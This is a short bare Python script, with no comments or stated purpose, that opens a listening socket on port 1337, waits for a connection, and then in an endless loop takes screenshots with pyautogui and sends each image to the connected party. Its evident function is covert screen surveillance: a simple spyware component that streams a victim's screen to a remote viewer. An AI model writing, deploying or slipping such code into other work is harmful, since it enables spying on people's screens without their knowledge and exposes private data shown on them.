import socket
import pyautogui as p

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 1337))
s.listen(1)
conn, addr = s.accept()
while True:
    p.screenshot("Screen.png")
    f = open("Screen.png", "rb")
    conn.send(f.read())
